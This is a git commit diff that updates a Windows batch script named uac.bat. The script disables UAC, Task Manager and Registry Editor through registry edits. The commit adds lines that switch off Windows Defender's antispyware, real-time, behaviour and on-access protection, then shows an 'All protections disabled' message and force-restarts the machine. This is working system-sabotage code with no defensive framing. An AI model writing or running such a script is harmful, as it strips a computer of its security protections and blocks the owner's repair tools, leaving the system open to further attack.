ffaa4c46fb2afaa43d343685a42ded7d2440f0da
Fynnmaster9000 <fynnmaster9000@gmail.com>
2025-07-19 13:29:08 +0200

    Update uac.bat

--- uac.bat
+++ uac.bat
@@ -1,5 +1,6 @@
 @echo off
-:: Disable EnableLua
+
+:: Disable UAC
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLua /t REG_DWORD /d 0 /f
 
 :: Disable Task Manager
@@ -8,10 +9,17 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v Disa
 :: Disable Registry Editor
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
 
+:: Disable Windows Defender (via registry)
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f
+
 :: Show message box
-echo MsgBox "EnableLua, Task Manager, and Regedit disabled." ^& vbCrLf ^& "System will now restart.", 64, "Done" > "%temp%\msgbox.vbs"
+echo MsgBox "All protections disabled. System will now restart.", 64, "Notice" > "%temp%\msgbox.vbs"
 cscript //nologo "%temp%\msgbox.vbs"
 del "%temp%\msgbox.vbs"
 
-:: Restart
-shutdown /r /t 3 /c "Restarting "
+:: Restart system
+shutdown /r /t 1 /c "Restarting to apply changes..."
